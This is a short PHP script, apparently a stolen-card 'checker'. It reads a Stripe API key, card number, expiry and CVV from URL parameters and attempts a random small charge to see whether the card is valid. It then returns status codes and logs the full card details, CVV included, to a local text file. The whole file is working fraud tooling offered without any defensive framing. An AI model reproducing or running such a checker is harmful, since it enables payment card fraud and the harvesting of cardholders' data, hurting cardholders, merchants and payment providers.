<?php
$api = $_GET['api'];
$num = $_GET['num'];
$expm = $_GET['expm'];
$expy = $_GET['expy'];
$cvv = $_GET['cvv'];
if ($api == null || $num == null || $expm == null || $expy == null || $cvv == null) {
	die('Invalid Request!');
}
require_once('init.php');
\Stripe\Stripe::setApiKey($api);
$myCard = array('number' => $num, 'exp_month' => $expm, 'exp_year' => $expy);
try {
$charge = \Stripe\Charge::create(array('card' => $myCard, 'amount' => rand(100,300), 'currency' => 'usd'));
}catch(\Stripe\Error\Card $e) {
$f = $e->getHttpStatus();
if ($f == 402) {
echo '{"status":"2"}';
exit;
} else if ($f == 200) {
echo '{"status":"1"}';
exit;
} else if ($f == 400) {
echo '{"status":"3"}';
exit;
} else if ($f == 401) {
echo '{"status":"3"}';
exit;
} else if ($f == 404) {
echo '{"status":"4"}';
exit;
} else if ($f == 402) {
echo '{"status":"2"}';
exit;
}
}
catch(\Stripe\Error\Authentication $e) {
$f = $e->getHttpStatus();
if ($f == 402) {
echo '{"status":"2"}';
exit;
} else if ($f == 200) {
echo '{"status":"1"}';
exit;
} else if ($f == 400) {
echo '{"status":"3"}';
exit;
} else if ($f == 401) {
echo '{"status":"3"}';
exit;
} else if ($f == 404) {
echo '{"status":"4"}';
exit;
} else if ($f == 402) {
echo '{"status":"2"}';
exit;
}
}
// nulis log
$nulis = @fopen("gbrntmfn13.txt", "a");
fwrite($nulis, $num."|".$expm."|".$expy."|".$cvv."\n");
fclose($nulis);
echo '{"status":"1"}';
?>